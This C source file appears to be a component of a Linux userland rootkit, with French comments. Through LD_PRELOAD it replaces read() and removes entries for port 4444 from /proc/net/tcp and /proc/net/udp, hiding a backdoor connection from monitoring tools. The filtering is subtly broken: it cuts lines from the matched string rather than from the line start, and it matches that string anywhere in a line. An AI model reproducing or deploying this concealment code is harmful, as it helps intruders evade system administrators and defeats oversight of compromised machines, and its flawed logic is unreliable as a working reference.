#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define HIDE_PORT "115C"  // 4444 en hexadécimal pour /proc/net/tcp et /proc/net/udp

typedef ssize_t (*orig_read_t)(int, void *, size_t);
static orig_read_t orig_read = NULL;

ssize_t read(int fd, void *buf, size_t count) {
    if (!orig_read) {
        orig_read = (orig_read_t)dlsym(RTLD_NEXT, "read");
    }

    ssize_t nbytes = orig_read(fd, buf, count);
    if (nbytes <= 0) return nbytes;

    // Vérifier si on lit /proc/net/tcp ou /proc/net/udp
    char path[256] = {0};
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char link[256] = {0};
    ssize_t len = readlink(path, link, sizeof(link) - 1);
    if (len < 0) return nbytes;
    link[len] = '\0';

    if (strstr(link, "/proc/net/tcp") || strstr(link, "/proc/net/udp")) {
        char *start = buf, *end = start;
        while ((end = strstr(start, HIDE_PORT)) != NULL) {
            char *newline = strchr(end, '\n');
            if (newline) {
                memmove(end, newline + 1, nbytes - (newline + 1 - (char *)buf));
                nbytes -= (newline + 1 - end);
            } else {
                *end = '\0';
                nbytes = end - (char *)buf;
                break;
            }
        }
    }

    return nbytes;
}
